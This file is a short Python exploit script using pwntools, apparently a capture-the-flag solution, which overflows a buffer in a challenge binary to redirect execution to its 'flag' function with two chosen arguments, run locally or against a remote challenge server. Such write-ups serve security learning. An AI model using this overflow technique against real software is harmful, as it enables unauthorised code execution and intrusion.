#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 Brahim BEN ARIBIA(2-B-A) <brahimbenaribia@gmail.com>
#
# Distributed under terms of the MIT license.

"""

"""
from pwn import *
# import struct

#--------setup--------#

context(arch="amd64", os="linux")

elf = ELF("./vuln", checksec=True)
local = True

if local:
    r = elf.process()
else:
    host = "142.93.35.92"
    port = 32056
    r = remote(host, port)

#--------bufferOverflow--------#

flag = elf.symbols["flag"]
a = 0xdeadbeef
b = 0xc0ded00d

payload = flat(
  b"A" * 188,
  p32(flag),
  b"A" * 4,
  p32(a),
  p32(b)
)

r.sendlineafter(b'You know who are 0xDiablos: \n', payload)
print(r.readall())
